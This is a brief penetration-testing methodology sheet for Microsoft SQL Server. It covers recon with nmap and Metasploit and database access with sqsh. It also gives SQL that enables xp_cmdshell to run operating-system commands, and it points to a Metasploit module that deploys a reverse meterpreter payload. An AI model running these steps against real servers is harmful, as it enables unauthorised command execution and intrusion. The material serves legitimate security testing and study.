# MSSQL - Methodology

### RECON

###### Basic recon

The Nmap *ms-sql-info.nse* script attempts to determine configuration and
version information for Microsoft SQL Server.  
The script will first gather information by querying the SQL Server Browser
service (that runs by default on UDP port 1434 and provides imprecise
version information) and then sending a probe to the instance to conduct
response packet analysis.
```bash
nmap --script ms-sql-info --script-args mssql.instance-port=1433 -p 1433 <TARGET>
```     
The Metasploit mssql_ping module attempts to retrieve similar information:
```bash
msf > use auxiliary/scanner/mssql/mssql_ping
```

### EXPLOITATION


### POST EXPLOITATION

###### Access the database

The sqsh CLI tool can be used to make queries to the database:
```
sqsh -U <USERNAME> -P <PASSWORD> -S <IP>:<PORT>
```

The DBeaver GUI tool can be used to simply access the database content without
knowing the proper MSSQL syntax.

###### OS command execution
On MSSQL server, operating system commands can be executed using the
*xp_cmdshell* function.  
The *xp_cmdshell* function is deactivated by default from SQL Server 2000 and
upwards and needs to be activated.  
The following query can be used to activate it given the
account used has sufficient privilege (sysadmin):
```SQL
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
go  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
go  
-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
go
-- To update the currently configured value for this feature.  
RECONFIGURE;  
go  
```
Operating system CMD commands can then be executed:
```SQL
EXEC xp_cmdshell '<CMD>'
go  
```
The Metasploit module *exploit/windows/mssql/mssql_payload* automates the tasks
above to deploy a payload, such as a reverse meterpreter, on the server:
```bash
msf > use exploit/windows/mssql/mssql_payload
```
